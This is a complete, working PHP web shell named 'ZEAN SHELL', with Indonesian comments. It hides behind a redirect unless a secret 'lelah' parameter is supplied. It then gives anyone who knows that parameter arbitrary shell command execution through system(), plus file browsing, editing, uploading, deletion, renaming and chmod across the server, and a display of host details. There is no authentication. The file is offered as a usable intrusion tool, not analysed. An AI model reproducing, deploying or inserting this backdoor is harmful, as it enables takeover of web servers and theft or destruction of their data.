<?php
// Jika parameter "lelah" tidak ada, redirect ke homepage
if (!isset($_GET['lelah']) && !isset($_POST['lelah'])) {
    header("Location: /"); // Ganti '/' dengan URL homepage situsmu jika perlu
    exit;
}

error_reporting(0);
set_time_limit(0);

// Path awal saat pertama load (default shell dir)
$initial_path = realpath(getcwd());

// Ambil path saat ini dari parameter (GET atau POST)
$path = null;
if (isset($_GET['path'])) {
    $path = realpath($_GET['path']);
} elseif (isset($_POST['path'])) {
    $path = realpath($_POST['path']);
}
if (!$path || !is_dir($path)) {
    $path = $initial_path;
}

// Fungsi untuk mendapatkan user dan group name
function getUserGroup($file) {
    $uid = fileowner($file);
    $gid = filegroup($file);
    $user = function_exists('posix_getpwuid') ? @posix_getpwuid($uid)['name'] ?? $uid : $uid;
    $group = function_exists('posix_getgrgid') ? @posix_getgrgid($gid)['name'] ?? $gid : $gid;
    return [$user, $group];
}

// Fungsi buat build URL agar selalu ada parameter lelah
function build_url($params = []) {
    $params['lelah'] = '';
    return '?' . http_build_query($params);
}

// Handle delete
if (isset($_GET['delete'])) {
    $target = realpath($path . DIRECTORY_SEPARATOR . $_GET['delete']);
    if (strpos($target, $path) === 0 && file_exists($target)) {
        is_dir($target) ? rmdir($target) : unlink($target);
        header("Location: " . build_url(['path' => $path]));
        exit;
    }
}

// Handle rename
if (isset($_POST['rename_from']) && isset($_POST['rename_to'])) {
    $from = $path . DIRECTORY_SEPARATOR . $_POST['rename_from'];
    $to   = $path . DIRECTORY_SEPARATOR . $_POST['rename_to'];
    if (file_exists($from) && !file_exists($to)) rename($from, $to);
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Handle chmod
if (isset($_POST['chmod_file']) && isset($_POST['new_perm'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_POST['chmod_file'];
    $perm = intval($_POST['new_perm'], 8);
    if (file_exists($file)) chmod($file, $perm);
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Create folder
if (isset($_POST['new_folder'])) {
    $new = $path . DIRECTORY_SEPARATOR . trim($_POST['new_folder']);
    if (!file_exists($new)) mkdir($new);
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Create file
if (isset($_POST['new_file'])) {
    $file = $path . DIRECTORY_SEPARATOR . trim($_POST['new_file']);
    if (!file_exists($file)) file_put_contents($file, "");
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Upload file
if (isset($_FILES['upload'])) {
    $dest = $path . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    move_uploaded_file($_FILES['upload']['tmp_name'], $dest);
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Handle file save (edit)
if (isset($_POST['save_file']) && isset($_POST['filename'])) {
    $file = $path . DIRECTORY_SEPARATOR . $_POST['filename'];
    file_put_contents($file, $_POST['save_file']);
    header("Location: " . build_url(['path' => $path]));
    exit;
}

// Shell command execution (gunakan POST agar aman)
$output = '';
if (isset($_POST['cmd'])) {
    chdir($path);
    ob_start();
    system($_POST['cmd']);
    $output = ob_get_clean();
}

// Informasi tambahan: IP server, domain, user, uname
$server_ip = gethostbyname(gethostname());
$remote_ip = $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
$server_name = $_SERVER['SERVER_NAME'] ?? 'Unknown';
$user = get_current_user();
$uname = php_uname();
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<title>🌐 ZEAN SHELL</title>
<style>
    body {
        background: #1e1e2f; color: #cfd2dc; font-family: monospace; margin:0; padding: 20px;
        opacity: 0; transition: opacity 0.5s ease;
    }
    body.fade-in { opacity: 1; }
    a { color: #61dafb; text-decoration: none; cursor: pointer; }
    a:hover { text-decoration: underline; }
    .container {
        display: flex;
        gap: 20px;
        min-height: 90vh;
    }
    /* Kiri: daftar file/folder */
    #file-list {
        flex-grow: 1;
        background: #2c2f4a;
        padding: 10px;
        border-radius: 8px;
        overflow: auto;
    }
    /* Kanan: panel vertikal */
    #side-panel {
        width: 380px;
        display: flex;
        flex-direction: column;
        gap: 20px;
    }
    #side-panel > div {
        background: #2c2f4a;
        padding: 10px;
        border-radius: 8px;
    }
    input, select, textarea {
        padding: 4px; background: #111; color: #0f0; border: 1px solid #555; margin: 2px;
        font-family: monospace;
    }
    input[type=submit], button.mini-btn {
        background: #333; color: white; cursor: pointer; border: none;
        padding: 5px 8px; border-radius: 3px;
        font-family: monospace;
    }
    .del-btn {
        color: #e74c3c; margin-left: 5px; text-decoration: none; cursor: pointer;
    }
    .mini-btn:hover, .del-btn:hover {
        color: red;
    }
    pre {
        background: #111; color: #0f0; padding: 10px; border-radius: 5px;
        overflow: auto; max-height: 300px;
        font-family: monospace;
    }
    .flex-header, .flex-row {
        display: flex; padding: 4px 0; border-bottom: 1px solid #333;
        align-items: center; font-size: 14px;
    }
    .flex-header {
        font-weight: bold; border-bottom: 2px solid #555;
    }
    .col-name { min-width: 25%; overflow-wrap: break-word; }
    .col-size { min-width: 8%; text-align: right; }
    .col-user { min-width: 10%; text-align: center; }
    .col-group { min-width: 10%; text-align: center; }
    .col-perm { min-width: 8%; text-align: center; }
    .col-time { min-width: 20%; }
    .col-action { min-width: 20%; }
    form { display: inline; margin: 0; }
    #back-button {
        margin-bottom: 10px;
    }
    /* Tambahan hover highlight baris */
    .flex-row:hover {
        background-color: #3a3f6b;
        cursor: pointer;
    }
    #info-box {
        background: #25284f; color: #9cf; padding: 10px;
        border-radius: 8px; margin-bottom: 20px;
        font-size: 14px;
        line-height: 1.5em;
    }
</style>
<script>
    document.addEventListener("DOMContentLoaded", function() {
        document.body.classList.add("fade-in");
        document.querySelectorAll('a[href]').forEach(link => {
            const href = link.getAttribute('href');
            if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
                link.addEventListener('click', function(e) {
                    e.preventDefault();
                    document.body.style.opacity = 0;
                    setTimeout(() => window.location.href = href, 400);
                });
            }
        });
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', () => {
                document.body.style.opacity = 0;
            });
        });
    });
</script>
</head>
<body>
<h1>🌐 ZEAN SHELL</h1>

<!-- Info tambahan IP, Domain, User, Uname -->
<div id="info-box">
    <b>🖥 Server Info:</b><br>
    IP Server: <?= htmlspecialchars($server_ip) ?><br>
    IP Client: <?= htmlspecialchars($remote_ip) ?><br>
    Domain: <?= htmlspecialchars($server_name) ?><br>
    User: <?= htmlspecialchars($user) ?><br>
    Uname: <?= htmlspecialchars($uname) ?><br>
</div>

<div id="back-button">
    <a href="<?= build_url(['path' => $initial_path]) ?>" style="font-weight:bold; color:#6af;">
        🔙 Back
    </a>
</div>

<div class="container">
    <div id="file-list">
<?php
// Breadcrumb path dengan root /
echo "<div class='path'><b>📁 Path:</b> ";
echo "<a href='" . build_url(['path' => DIRECTORY_SEPARATOR]) . "'>/</a> / ";

$parts = explode(DIRECTORY_SEPARATOR, $path);
$nav = "";
foreach ($parts as $p) {
    if ($p === "") continue;
    $nav .= DIRECTORY_SEPARATOR . $p;
    echo "<a href='" . build_url(['path' => $nav]) . "'>" . htmlspecialchars($p) . "</a> / ";
}
echo "</div>";

// Urutkan file dan folder
$files = scandir($path);
$folders = [];
$files_only = [];

foreach ($files as $file) {
    if ($file === '.') continue;
    $full = $path . DIRECTORY_SEPARATOR . $file;
    if (is_dir($full)) {
        $folders[] = $file;
    } else {
        $files_only[] = $file;
    }
}

sort($folders, SORT_NATURAL | SORT_FLAG_CASE);
sort($files_only, SORT_NATURAL | SORT_FLAG_CASE);
$all = array_merge($folders, $files_only);

echo "<div class='box'>";
echo "<div class='flex-header'>
    <div class='col-name'>Nama</div>
    <div class='col-size'>Ukuran</div>
    <div class='col-user'>User</div>
    <div class='col-group'>Group</div>
    <div class='col-perm'>Perm</div>
    <div class='col-time'>Waktu</div>
    <div class='col-action'>Aksi</div>
</div>";

foreach ($all as $file) {
    $full = $path . DIRECTORY_SEPARATOR . $file;
    $isDir = is_dir($full);
    $size = $isDir ? '-' : number_format(filesize($full)) . ' B';
    $perm = substr(sprintf('%o', fileperms($full)), -4);
    $time = date("Y-m-d H:i:s", filemtime($full));
    list($user, $group) = getUserGroup($full);

    $link = $isDir
        ? "<a href='" . build_url(['path' => $full]) . "'>📁 " . htmlspecialchars($file) . "</a>"
        : "<a href='" . build_url(['path' => $path, 'view' => $file]) . "'>📄 " . htmlspecialchars($file) . "</a>";

    $del = "<a class='del-btn' href='" . build_url(['path' => $path, 'delete' => $file]) . "' onclick=\"return confirm('Hapus $file?');\">❌</a>";

    $ren = "<form method='POST' style='display:inline; margin-left:5px;'>
                <input type='hidden' name='rename_from' value='" . htmlspecialchars($file) . "'>
                <input type='text' name='rename_to' size='8' placeholder='Rename'>
                <input type='hidden' name='lelah' value=''>
                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
                <input type='submit' value='OK' class='mini-btn'>
            </form>";

    $chmod = "<form method='POST' style='display:inline; margin-left:5px;'>
                <input type='hidden' name='chmod_file' value='" . htmlspecialchars($file) . "'>
                <input type='text' name='new_perm' size='4' value='$perm'>
                <input type='hidden' name='lelah' value=''>
                <input type='hidden' name='path' value='" . htmlspecialchars($path) . "'>
                <input type='submit' value='OK' class='mini-btn'>
            </form>";

    echo "<div class='flex-row'>
        <div class='col-name'>$link</div>
        <div class='col-size' style='text-align:right;'>$size</div>
        <div class='col-user' style='text-align:center;'>$user</div>
        <div class='col-group' style='text-align:center;'>$group</div>
        <div class='col-perm' style='text-align:center;'>$perm</div>
        <div class='col-time'>$time</div>
        <div class='col-action'>$del $ren $chmod</div>
    </div>";
}
echo "</div>";
?>
    </div>

    <div id="side-panel">

        <!-- File Edit Panel -->
<?php if (isset($_GET['view']) && is_file($path . DIRECTORY_SEPARATOR . $_GET['view'])): 
    $file_view = $path . DIRECTORY_SEPARATOR . $_GET['view'];
    $content = htmlspecialchars(file_get_contents($file_view));
?>
    <div>
        <h3>Edit File: <?= htmlspecialchars($_GET['view']) ?></h3>
        <form method="POST">
            <textarea name="save_file" rows="15" style="width:100%; background:#111; color:#0f0;"><?= $content ?></textarea>
            <input type="hidden" name="filename" value="<?= htmlspecialchars($_GET['view']) ?>">
            <input type="hidden" name="lelah" value="">
            <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
            <input type="submit" value="Simpan" style="width:100%; margin-top:5px;">
        </form>
    </div>
<?php else: ?>
    <div>
        <h3>Tidak ada file yang dipilih untuk diedit</h3>
    </div>
<?php endif; ?>

        <!-- New Folder & New File -->
        <div>
            <h3>Buat Folder / File Baru</h3>
            <form method="POST" style="margin-bottom:10px;">
                <input type="text" name="new_folder" placeholder="Nama folder baru" style="width:100%;">
                <input type="hidden" name="lelah" value="">
                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                <input type="submit" value="Buat Folder" style="width:100%; margin-top:5px;">
            </form>
            <form method="POST">
                <input type="text" name="new_file" placeholder="Nama file baru" style="width:100%;">
                <input type="hidden" name="lelah" value="">
                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                <input type="submit" value="Buat File" style="width:100%; margin-top:5px;">
            </form>
        </div>

        <!-- Upload File -->
        <div>
            <h3>Upload File</h3>
            <form method="POST" enctype="multipart/form-data">
                <input type="file" name="upload" style="width:100%;">
                <input type="hidden" name="lelah" value="">
                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                <input type="submit" value="Upload" style="width:100%; margin-top:5px;">
            </form>
        </div>

        <!-- Terminal -->
        <div>
            <h3>Terminal (Shell Command)</h3>
            <form method="POST">
                <input type="text" name="cmd" placeholder="Masukkan perintah shell" style="width:100%;" autocomplete="off">
                <input type="hidden" name="lelah" value="">
                <input type="hidden" name="path" value="<?= htmlspecialchars($path) ?>">
                <input type="submit" value="Jalankan" style="width:100%; margin-top:5px;">
            </form>
            <pre><?= htmlspecialchars($output) ?></pre>
        </div>
    </div>
</div>

</body>
</html>
